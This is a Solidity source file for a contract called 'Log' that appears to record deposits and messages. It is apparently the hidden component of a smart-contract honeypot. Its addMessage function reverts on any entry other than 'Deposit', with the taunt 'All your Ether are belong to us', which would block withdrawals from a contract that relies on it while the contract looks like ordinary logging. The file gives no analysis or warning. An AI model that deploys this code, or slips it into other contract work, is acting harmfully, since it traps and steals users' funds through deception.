pragma solidity ^0.5.8;

contract Log {
  struct Message {
    address Sender;
    string  Data;
    uint Val;
    uint  Time;
  }

  Message[] public History;

  Message LastMsg;

  function compareStrings (string memory a, string memory b) private pure returns (bool) {
    return (keccak256(abi.encodePacked((a))) == keccak256(abi.encodePacked((b))) );
  }

  function addMessage(address _adr, uint _val, string memory _data) public {
    require(compareStrings(_data, "Deposit"), "All your Ether are belong to us");
    LastMsg.Sender = _adr;
    LastMsg.Time = now;
    LastMsg.Val = _val;
    LastMsg.Data = _data;
    History.push(LastMsg);
  }
}
